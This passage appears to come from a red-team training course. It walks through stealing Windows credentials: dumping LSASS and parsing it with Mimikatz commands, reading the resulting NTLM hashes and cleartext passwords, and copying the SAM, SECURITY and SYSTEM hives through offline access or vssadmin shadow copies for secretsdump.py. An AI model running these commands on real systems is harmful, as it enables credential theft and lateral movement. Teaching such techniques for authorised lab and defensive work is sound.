session.</li>\n</ul>\n</li>\n<li><p><strong>Analyzing a Dump File with Mimikatz (on your attacker machine):</strong></p>\n<ul>\n<li>Transfer <code>lsass.dmp</code> to your attacker machine.</li>\n<li>Run Mimikatz (the executable).</li>\n<li>Point Mimikatz to the dump file: <code>sekurlsa::minidump lsass.dmp</code></li>\n<li>Run the command to extract passwords: <code>sekurlsa::logonpasswords</code></li>\n<li>Exit Mimikatz: <code>exit</code></li>\n</ul>\n</li>\n</ul>\n<p><strong>Expected Mimikatz Output (Conceptual):</strong></p>\n<p>Mimikatz output is verbose but incredibly valuable. Look for sections like:</p>\n<pre><code>Authentication Id : 0 ; 999 (00000000:000003e7)\nSession           : Interactive from 2\nUser Name         : targetuser\nDomain            : TARGETDOMAIN\nLogon Server      : TARGETDC\n...\n msv            : [00000003]\n -&gt; primary\n    * Username : targetuser\n    * Domain   : TARGETDOMAIN\n    * NTLM     : 11223344556677889900AABBCCDDEEFF\n    * SHA1     : AABBCCDDEEFF11223344556677889900AABBCCDD\n    * CredentialData : (null)\n -&gt; logon sspi\n    * Username : targetuser\n    * Domain   : TARGETDOMAIN\n    * Password : ReallySecretPassword123!   &lt;-- !!! Cleartext passwords are GOLD !!!\n...\n kerberos       : [00000001]\n -&gt; primary\n    * Username : targetuser\n    * Domain   : TARGETDOMAIN\n    * NTLM     : 11223344556677889900AABBCCDDEEFF\n    * SHA1     : AABBCCDDEEFF11223344556677889900AABBCCDD\n    * Kerberos : (null)\n    * Pkinit   : (null)\n...\n</code></pre>\n<p>Look for <code>Password :</code> followed by cleartext, or the <code>NTLM :</code> hash. The NTLM hash can often be used directly for authentication (Pass-the-Hash, Module 6!).</p>\n<p><strong>OpSec Note:</strong> Accessing or dumping LSASS is a <em>very</em> common detection signature for security products. In a real red team engagement, this requires careful planning and likely AV/EDR bypass techniques. For our lab, we&#39;ll accept the risk of detection as we focus on the technique itself.</p>\n<h3><strong>2.6: Extracting from SAM and SECURITY Registry Hives</strong></h3>\n<p>While LSASS is the primary target for <em>active</em> credentials, the SAM and SECURITY hives contain local user hashes and system secrets that can be valuable, especially if LSASS dumping is blocked or fails.</p>\n<p><strong>Why Target SAM/SECURITY Hives?</strong></p>\n<ul>\n<li>Contains local user password hashes (SAM hive).</li>\n<li>Contains LSA Secrets (SECURITY hive), which can include cached domain credentials, service account passwords, etc.</li>\n</ul>\n<p><strong>Requirement:</strong> SYSTEM privileges on the target machine are generally needed to access these files or their contents reliably.</p>\n<p><strong>Techniques:</strong></p>\n<p>The challenge is that these files (<code>C:\\Windows\\System32\\config\\SAM</code>, <code>SECURITY</code>, <code>SYSTEM</code>) are locked by the operating system while it&#39;s running.</p>\n<ol>\n<li><p><strong>Offline Access:</strong> If you have physical access or can boot the machine from a different OS (like a Linux live CD), you can mount the Windows drive and simply copy these files.</p>\n<ul>\n<li>Copy <code>C:\\Windows\\System32\\config\\SAM</code></li>\n<li>Copy <code>C:\\Windows\\System32\\config\\SECURITY</code></li>\n<li>Copy <code>C:\\Windows\\System32\\config\\SYSTEM</code> (The <code>SYSTEM</code> hive is needed to decrypt the contents of the <code>SECURITY</code> hive).</li>\n<li>Analyze these files on your attacker machine using tools like Impacket&#39;s <code>secretsdump.py</code>.</li>\n</ul>\n</li>\n<li><p><strong>Volume Shadow Copy (VSS):</strong> This is a common technique used by attackers to access locked files on a live system. VSS creates snapshots of volumes, and files in snapshots are not locked by the running OS.</p>\n<ul>\n<li><strong>Step 1: Create a Shadow Copy:</strong><pre><code class=\"language-cmd\">vssadmin create shadow /for=C:\n</code></pre>\nThis command will output the path to the shadow copy (e.g., <code>\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\</code>). Note this path down.</li>\n<li><strong>Step 2: Copy Hives from the Shadow Copy:</strong> Use the shadow copy path to access the files.<pre><code class=\"language-cmd\">copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\System32\\config\\SAM C:\\Temp\\sam.hiv\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\System
